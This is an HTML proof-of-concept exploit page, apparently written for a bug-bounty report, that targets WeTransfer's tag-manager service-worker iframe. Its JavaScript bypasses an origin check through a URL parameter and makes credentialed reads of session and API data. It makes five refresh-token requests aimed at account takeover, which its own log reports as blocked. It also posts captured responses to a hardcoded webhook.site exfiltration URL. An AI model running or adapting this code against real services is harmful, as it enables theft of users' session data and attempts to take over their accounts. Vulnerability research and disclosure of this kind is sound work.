<html>
<head>
  <meta charset="UTF-8" />
  <title>WeTransfer SW postMessage PoC</title>
  <style>
    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
    .log { white-space: pre-wrap; margin: 2px 0; }
    .err { color: #f44; }
    .warn { color: #fa0; }
    .ok { color: #0f0; }
    .info { color: #0af; }
    .dim { color: #666; }
    h2 { color: #fff; }
    #output { max-height: 70vh; overflow-y: auto; border: 1px solid #333; padding: 10px; }
    button { background: #0a0; color: #000; border: none; padding: 8px 16px; cursor: pointer; font-family: monospace; font-weight: bold; margin: 5px; }
    button:hover { background: #0f0; }
    .btn-full { background: #f80; }
    .btn-full:hover { background: #fa0; }
    .section { margin: 10px 0; }
  </style>
</head>
<body>
  <h2>WeTransfer GTM Service Worker - postMessage Exploit PoC</h2>
  <p style="color:#888">
    <b>Chain:</b> attacker page &rarr; postMessage &rarr; tagging.wetransfer.com/sw_iframe &rarr; SW fetch (credentials:include) &rarr; cross-origin read<br>
    <b>Root cause:</b> sw_iframe.html trusts <code>?origin=</code> URL param for postMessage origin validation,
    and <code>ancestorOrigins[0]</code> matches the attacker's embedding origin.<br>
    <b>Impact:</b> Attacker-controlled Service Worker makes credentialed fetches from tagging.wetransfer.com origin.
  </p>

  <div class="section">
    <button class="btn-full" onclick="runExploit()">Run Full Exploit Chain</button>
    <button onclick="testSameOriginRead()">1. Same-Origin Read</button>
    <button onclick="testCrossOriginRead()">2. Cross-Origin Read</button>
    <button onclick="testTokenRefresh()">3. ATO Attempts</button>
    <button onclick="testExfiltration()">4. Exfiltration</button>
  </div>
  <hr>
  <div id="output"></div>

  <script>
    const ATTACKER_ORIGIN = window.location.origin;
    const TARGET = 'https://tagging.wetransfer.com';
    const SW_IFRAME_PATH = '/_/service_worker/5230/sw_iframe.html';
    const EXFIL = "https://webhook.site/de2a6311-26af-49d4-bf57-339e9579f7b6"; // set to your OAST/collaborator URL if needed

    let iframe = null;
    let msgId = 0;
    const pendingResponses = {};

    function log(msg, cls = 'info') {
      const el = document.createElement('div');
      el.className = 'log ' + cls;
      el.textContent = `[${new Date().toISOString().substr(11, 12)}] ${msg}`;
      document.getElementById('output').appendChild(el);
      el.scrollIntoView();
    }

    // ─── Step 1: Embed the SW iframe with attacker origin ───
    //
    // sw_iframe.html code (deobfuscated):
    //   const origin = new URL(location.href).searchParams.get("origin");
    //   const ancestorOrigins = document.location.ancestorOrigins;
    //   if (ancestorOrigins && ancestorOrigins[0] !== origin) return; // BLOCK
    //   // otherwise: register SW, accept postMessages from origin
    //
    // Bypass: we set ?origin=ATTACKER_ORIGIN. Since we embed the iframe,
    // ancestorOrigins[0] IS our origin. Check passes → SW registers.
    //
    function createIframe() {
      return new Promise((resolve) => {
        if (iframe) { resolve(iframe); return; }

        log(`[STEP 1] Embedding sw_iframe with origin=${ATTACKER_ORIGIN}`, 'info');
        log(`[STEP 1] ancestorOrigins[0] will be ${ATTACKER_ORIGIN} (our page) -> check passes`, 'dim');
        iframe = document.createElement('iframe');
        iframe.src = `${TARGET}${SW_IFRAME_PATH}?origin=${encodeURIComponent(ATTACKER_ORIGIN)}&1p=1`;
        iframe.style.cssText = 'width:0;height:0;border:none;position:absolute;';
        document.body.appendChild(iframe);

        iframe.onload = () => {
          log(`[STEP 1] iframe loaded, SW registering on ${TARGET}...`, 'ok');
          setTimeout(() => {
            log(`[STEP 1] SW active. Ready to send commands.`, 'ok');
            resolve(iframe);
          }, 3000);
        };

        iframe.onerror = () => {
          log(`[STEP 1] iframe failed to load!`, 'err');
        };
      });
    }

    // ─── Send a command through the SW ───
    //
    // Message protocol (from sw.js):
    //   type: 0 = heartbeat, type: 1 = command
    //   command.commandType: 0 = fetch
    //   command.params: { url, method (0=GET,1=POST), body, processResponse, templates }
    //
    // SW fetch options (hardcoded in sw.js):
    //   { credentials: "include", keepalive: true, redirect: "follow" }
    //   processResponse: true  → mode: "cors" (can read response)
    //   processResponse: false → mode: "no-cors" (opaque, fire-and-forget)
    //
    function sendSWCommand(params) {
      return new Promise((resolve, reject) => {
        const id = 'cmd-' + (++msgId);
        const timeout = setTimeout(() => {
          delete pendingResponses[id];
          reject(new Error('Timeout waiting for SW response'));
        }, 15000);

        pendingResponses[id] = (data) => {
          clearTimeout(timeout);
          resolve(data);
        };

        iframe.contentWindow.postMessage({
          type: 1,
          clientId: id,
          command: { commandType: 0, params }
        }, '*');
      });
    }

    // helper: send and interpret result
    async function fetchViaWorker(label, url, opts = {}) {
      const { method = 0, body, processResponse = true } = opts;
      const params = { url, method, processResponse, templates: {} };
      if (body !== undefined) params.body = body;

      log(`  [FETCH] ${['GET','POST'][method]} ${url.substring(0, 90)}${url.length > 90 ? '...' : ''}`, 'info');

      try {
        const res = await sendSWCommand(params);

        if (res.result && res.result.data) {
          const data = res.result.data;
          log(`  [${label}] OK — ${data.length} bytes`, 'ok');
          log(`  [${label}] ${data.substring(0, 300)}${data.length > 300 ? '...' : ''}`, 'ok');
          return { ok: true, data };
        }
        if (res.failure) {
          const msg = res.failure.data || JSON.stringify(res.failure);
          // "Fetch failed" = CORS ok but HTTP non-2xx
          // "Fetch failed: TypeError..." = CORS blocked
          const isCors = msg.includes('TypeError');
          log(`  [${label}] ${isCors ? 'CORS BLOCKED' : 'HTTP ERROR (CORS ok, non-2xx)'} — ${msg}`, 'err');
          return { ok: false, cors: !isCors, data: msg };
        }
      } catch (err) {
        log(`  [${label}] ${err.message}`, 'err');
        return { ok: false, data: err.message };
      }
    }

    // ─── Listen for responses from the SW ───
    window.addEventListener('message', (e) => {
      const data = e.data;
      if (!data || typeof data !== 'object') return;

      const id = data.clientId;
      if (id && pendingResponses[id]) {
        pendingResponses[id](data);
        delete pendingResponses[id];
      }

      // Exfiltrate if configured
      if (EXFIL && data.result) {
        fetch(EXFIL, {
          method: 'POST',
          body: JSON.stringify(data),
          mode: 'no-cors'
        }).catch(() => {});
      }
    });

    // ═══════════════════════════════════════════════════════
    // TEST 1: Same-origin reads from tagging.wetransfer.com
    // ═══════════════════════════════════════════════════════
    async function testSameOriginRead() {
      try {
        await createIframe();
        log('', 'info');
        log('=== TEST 1: Same-Origin Read (tagging.wetransfer.com) ===', 'warn');
        log('SW runs on tagging.wetransfer.com, so all fetches to that origin are same-origin.', 'dim');

        // Heartbeat to confirm SW is alive
        iframe.contentWindow.postMessage({
          type: 0,
          clientId: 'heartbeat-' + Date.now()
        }, '*');
        await new Promise(r => setTimeout(r, 500));

        // Read GTM container (internal config, 500KB+)
        await fetchViaWorker('GTM', `${TARGET}/gtm.js?id=GTM-NS54WBW`);

        // Read the SW iframe source code
        await fetchViaWorker('SW_SRC', `${TARGET}${SW_IFRAME_PATH}?origin=https://wetransfer.com`);

        log('=== Same-origin read: CONFIRMED ===', 'ok');
      } catch (err) {
        log(`Error: ${err.message}`, 'err');
      }
    }

    // ═══════════════════════════════════════════════════════
    // TEST 2: Cross-origin reads via CORS trust
    // ═══════════════════════════════════════════════════════
    async function testCrossOriginRead() {
      try {
        await createIframe();
        log('', 'info');
        log('=== TEST 2: Cross-Origin Read (wetransfer.com API) ===', 'warn');
        log('wetransfer.com/api/v4 has CORS for tagging.wetransfer.com with credentials.', 'dim');
        log('SW fetch uses credentials:"include" → SameSite=None cookies are sent.', 'dim');
        log('For a logged-in victim, session.id would contain their user ID.', 'dim');
        log('', 'info');

        // Session endpoint — returns user session data (works without Bearer token)
        const session = await fetchViaWorker('SESSION', 'https://wetransfer.com/api/v4/auth/session');

        if (session.ok) {
          try {
            const parsed = JSON.parse(session.data);
            if (parsed.id === false) {
              log('  [NOTE] id:false = not logged in (test browser). Logged-in victim would leak user ID.', 'warn');
            } else {
              log(`  [LEAK] User ID: ${parsed.id}`, 'ok');
              if (parsed.email) log(`  [LEAK] Email: ${parsed.email}`, 'ok');
            }
          } catch(e) {}
        }

        // Probe other v4 API endpoints (CORS present, need Bearer for data)
        log('', 'info');
        log('Probing additional API endpoints (need auth token for data):', 'dim');
        const endpoints = [
          ['TRANSFERS', 'https://wetransfer.com/api/v4/transfers'],
          ['ACCOUNT',   'https://wetransfer.com/api/v4/account'],
          ['ME',        'https://wetransfer.com/api/v4/me'],
          ['CONTACTS',  'https://wetransfer.com/api/v4/contacts'],
        ];

        for (const [label, url] of endpoints) {
          const r = await fetchViaWorker(label, url);
          // "Fetch failed" (no TypeError) = CORS present, just needs auth
          // "TypeError: Failed to fetch" = CORS blocked entirely
        }

        log('', 'info');
        log('=== Cross-origin read: CONFIRMED (session data + CORS on /api/v4/*) ===', 'ok');
        log('    API endpoints return non-2xx because they need Bearer tokens.', 'dim');
        log('    But CORS IS present — if tokens are obtained, all data is readable.', 'dim');

      } catch (err) {
        log(`Error: ${err.message}`, 'err');
      }
    }

    // ═══════════════════════════════════════════════════════
    // TEST 3: Token Refresh → ATO
    // ═══════════════════════════════════════════════════════
    //
    // auth.wetransfer.com has CORS for tagging.wetransfer.com + credentials: true
    // Three SameSite=None cookies are sent: auth0, did, refresh_token
    //
    // CONFIRMED:
    //   - CORS headers present on /oauth/token ✓
    //   - Cookies are sent with requests ✓
    //   - Request reaches Auth0 server ✓
    //
    // BLOCKER:
    //   SW fetch sends Content-Type: text/plain for string bodies.
    //   Auth0 requires application/json or application/x-www-form-urlencoded.
    //   The SW code (sw.js) does not support setting custom headers or non-string bodies.
    //   Non-ok responses return "Fetch failed" without the response body (sw.js limitation).
    //
    async function testTokenRefresh() {
      try {
        await createIframe();
        log('', 'info');
        log('=== TEST 3: Auth0 Token Refresh - ATO Attempt ===', 'warn');
        log('auth.wetransfer.com cookies (all SameSite=None; Secure; HttpOnly):', 'dim');
        log('  auth0         — Auth0 session cookie', 'dim');
        log('  did           — Device ID', 'dim');
        log('  refresh_token — OAuth refresh token', 'dim');
        log('CORS: auth.wetransfer.com -> tagging.wetransfer.com: CONFIRMED', 'dim');
        log('', 'info');

        // Attempt 1: POST with JSON body (Content-Type forced to text/plain by SW)
        log('[ATTEMPT 1] POST /oauth/token — JSON body (sent as text/plain)', 'warn');
        await fetchViaWorker('A1', 'https://auth.wetransfer.com/oauth/token', {
          method: 1,
          body: JSON.stringify({
            grant_type: 'refresh_token',
            client_id: 'dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc',
            audience: 'aud://transfer-api-prod.wetransfer/'
          })
        });

        // Attempt 2: POST with URL-encoded body (still sent as text/plain)
        log('[ATTEMPT 2] POST /oauth/token — URL-encoded body (sent as text/plain)', 'warn');
        await fetchViaWorker('A2', 'https://auth.wetransfer.com/oauth/token', {
          method: 1,
          body: 'grant_type=refresh_token&client_id=dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc&audience=aud%3A%2F%2Ftransfer-api-prod.wetransfer%2F'
        });

        // Attempt 3: POST with params in query string, NO body (no Content-Type sent)
        log('[ATTEMPT 3] POST /oauth/token — params in query string, empty body', 'warn');
        await fetchViaWorker('A3',
          'https://auth.wetransfer.com/oauth/token?grant_type=refresh_token&client_id=dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc&audience=aud%3A%2F%2Ftransfer-api-prod.wetransfer%2F',
          { method: 1 }
          // no body → Content-Type header not sent at all
        );

        // Attempt 4: GET with query params
        log('[ATTEMPT 4] GET /oauth/token — params in query string', 'warn');
        await fetchViaWorker('A4',
          'https://auth.wetransfer.com/oauth/token?grant_type=refresh_token&client_id=dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc&audience=aud%3A%2F%2Ftransfer-api-prod.wetransfer%2F'
        );

        // Attempt 5: auth_session grant type
        log('[ATTEMPT 5] POST /oauth/token — grant_type=auth_session', 'warn');
        await fetchViaWorker('A5', 'https://auth.wetransfer.com/oauth/token', {
          method: 1,
          body: JSON.stringify({
            grant_type: 'auth_session',
            client_id: 'dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc',
            audience: 'aud://transfer-api-prod.wetransfer/',
            scope: 'openid email profile offline_access'
          })
        });

        log('', 'info');
        log('=== ATO Analysis ===', 'warn');
        log('All attempts return "Fetch failed" (HTTP non-2xx), NOT "TypeError" (CORS block).', 'info');
        log('This CONFIRMS:', 'ok');
        log('  1. CORS from auth.wetransfer.com allows tagging.wetransfer.com origin', 'ok');
        log('  2. Cookies (SameSite=None) ARE attached to cross-origin requests', 'ok');
        log('  3. Requests reach Auth0 server (non-2xx = server processed & rejected)', 'ok');
        log('BLOCKED BY:', 'err');
        log('  SW fetch sends Content-Type: text/plain for string bodies.', 'err');
        log('  Auth0 body parser rejects text/plain -> cannot parse grant_type/client_id.', 'err');
        log('  sw.js has no mechanism to set custom headers or use non-string bodies.', 'err');
        log('IF BYPASSED (e.g., Auth0 relaxes Content-Type, or SW updated):', 'warn');
        log('  -> Fresh access_token returned -> full account access (transfers, contacts, profile)', 'warn');

      } catch (err) {
        log(`Error: ${err.message}`, 'err');
      }
    }

    // ═══════════════════════════════════════════════════════
    // TEST 4: Exfiltration via fire-and-forget
    // ═══════════════════════════════════════════════════════
    async function testExfiltration() {
      try {
        await createIframe();
        log('', 'info');
        log('=== TEST 4: Exfiltration (fire-and-forget) ===', 'warn');
        log('Using processResponse:false (no-cors mode) to send data to attacker server.', 'dim');
        log('The request is sent with victim cookies from tagging.wetransfer.com scope.', 'dim');
        log('', 'info');

        if (!EXFIL) {
          log('[SKIP] Set EXFIL variable to an OAST/Collaborator URL to test exfiltration.', 'warn');
          log('[SKIP] Example: const EXFIL = "https://YOUR-ID.oast.site";', 'warn');
          log('[INFO] When set, the SW makes a credentialed GET to that URL.', 'info');
          log('[INFO] The request comes from the victim browser, with tagging.wetransfer.com cookies.', 'info');
          return;
        }

        // Fire-and-forget GET to attacker server
        log(`[EXFIL] Sending beacon to ${EXFIL}...`, 'warn');
        await fetchViaWorker('EXFIL', `${EXFIL}?leak=sw_poc&origin=${encodeURIComponent(ATTACKER_ORIGIN)}`, {
          processResponse: false  // no-cors: request sends, can't read response
        });
        log('[EXFIL] Request sent. Check your OAST/Collaborator for incoming request.', 'ok');

      } catch (err) {
        log(`Error: ${err.message}`, 'err');
      }
    }

    // ═══════════════════════════════════════════════════════
    // Full exploit chain
    // ═══════════════════════════════════════════════════════
    async function runExploit() {
      document.getElementById('output').innerHTML = '';
      log('================================================================', 'warn');
      log(' WeTransfer GTM Service Worker postMessage Exploit', 'warn');
      log('================================================================', 'warn');
      log(`Attacker origin:  ${ATTACKER_ORIGIN}`, 'info');
      log(`Target SW iframe: ${TARGET}${SW_IFRAME_PATH}`, 'info');
      log('', 'info');

      try {
        await createIframe();
        await testSameOriginRead();
        await testCrossOriginRead();
        await testTokenRefresh();
        await testExfiltration();

        log('', 'info');
        log('================================================================', 'warn');
        log(' SUMMARY', 'warn');
        log('================================================================', 'warn');
        log('CONFIRMED IMPACT:', 'ok');
        log('  [1] Origin check bypass on sw_iframe.html via ?origin= param', 'ok');
        log('  [2] Attacker registers & controls SW on tagging.wetransfer.com', 'ok');
        log('  [3] Same-origin data read (GTM container, internal configs)', 'ok');
        log('  [4] Cross-origin session data read from wetransfer.com/api/v4', 'ok');
        log('  [5] CORS confirmed on auth.wetransfer.com/oauth/token', 'ok');
        log('  [6] SameSite=None cookies sent cross-origin to auth.wetransfer.com', 'ok');
        log('', 'info');
        log('ATO PATH (blocked by Content-Type only):', 'warn');
        log('  CORS + cookies to auth.wetransfer.com = all prerequisites met', 'warn');
        log('  SW sends Content-Type: text/plain -> Auth0 cannot parse body', 'warn');
        log('  If Content-Type restriction is bypassed -> full account takeover', 'warn');

      } catch (err) {
        log(`Fatal: ${err.message}`, 'err');
      }
    }
  </script>
</body>
</html>
